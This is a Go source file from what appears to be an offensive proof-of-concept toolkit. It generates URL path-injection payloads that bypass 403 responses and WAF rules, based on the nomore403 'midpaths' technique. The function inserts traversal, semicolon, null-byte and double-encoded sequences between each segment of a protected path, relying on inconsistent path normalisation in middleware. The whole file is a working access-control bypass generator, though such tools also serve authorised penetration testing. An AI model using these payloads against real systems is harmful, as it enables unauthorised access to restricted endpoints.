package poc

import (
	"strings"
)

// MidPaths 生成路径中间注入 payload
// ref: nomore403 midpaths technique
// 原理: 在 URL 路径段之间注入特殊字符序列，干扰路径解析
// 部分中间件/WAF 在规范化路径时处理不一致
func MidPaths(auth string) []string {
	midInjections := []string{
		"/./",
		"/../",
		"/..;/",
		"/%2e/",
		"/%2e%2e/",
		"/%2f/",
		"//",
		"///",
		"/;/",
		"/;//",
		";%2f",
		"/%00/",
		"/%0d/",
		"/%0a/",
		"/%20/",
		"/%09/",
		"/.;/",
		"/..;%00/",
		"/..%00;/",
		"/%2e;/",
		"/%252e/",
		"/%252e%252e/",
		"/.%00./",
		"/.%0d./",
	}

	parts := strings.Split(auth, "/")
	var results []string

	// 在每个路径段之间插入 midInjection
	for _, injection := range midInjections {
		for insertIdx := 1; insertIdx < len(parts); insertIdx++ {
			var sb strings.Builder
			for i, part := range parts {
				if i == 0 {
					continue // skip empty first element from leading /
				}
				if i == insertIdx {
					sb.WriteString(injection)
				} else if i > 0 {
					sb.WriteString("/")
				}
				sb.WriteString(part)
			}
			result := "/" + sb.String()
			if result != auth {
				results = append(results, result)
			}
		}
	}

	return results
}
